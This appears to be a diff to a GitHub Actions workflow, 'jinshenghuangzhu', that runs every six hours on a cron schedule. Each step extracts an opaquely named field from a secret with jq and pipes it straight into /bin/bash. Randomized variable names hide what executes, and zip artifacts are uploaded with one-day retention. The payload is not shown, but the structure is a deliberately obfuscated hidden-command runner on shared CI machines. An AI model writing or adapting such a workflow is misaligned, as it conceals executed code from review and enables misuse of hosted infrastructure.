@@ -1,25 +1,27 @@
 name: jinshenghuangzhu
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '1 1/6 * * *'
 
-jobs:  # 976
+  schedule:
+    - cron: '55 5,11,17,23 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: jinshenghuangzhu
         env:
-          dscb24875: ${{ secrets.dscb24875 }}
+          p8: ${{ secrets.p8 }}
         run: |
-          echo $dscb24875 | jq -r .mnwk8074 | /bin/bash
-          echo $nxsik72 | jq -r .tcjdw1 | /bin/bash
-          echo $ync670 | jq -r .e869 | /bin/bash
-          echo $e452 | jq -r .ip0 | /bin/bash
-          echo $zm412 | jq -r .kl04 | /bin/bash
-          echo $vjwke5357 | jq -r .rxlcc4 | /bin/bash
-          echo $gh19 | jq -r .cxo012 | /bin/bash
+          printf '%s' "$p8" | jq -r .cght3 | /bin/bash
+          printf '%s' "$gowj42" | jq -r .bnr43 | /bin/bash
+          printf '%s' "$ql7080" | jq -r .bjum524 | /bin/bash
+          echo $hzpwa41077 | jq -r .a25 | /bin/bash
+          printf '%s' "$hi76" | jq -r .nio542 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: eTsw309e
+          path: "*.zip"
+          retention-days: 1
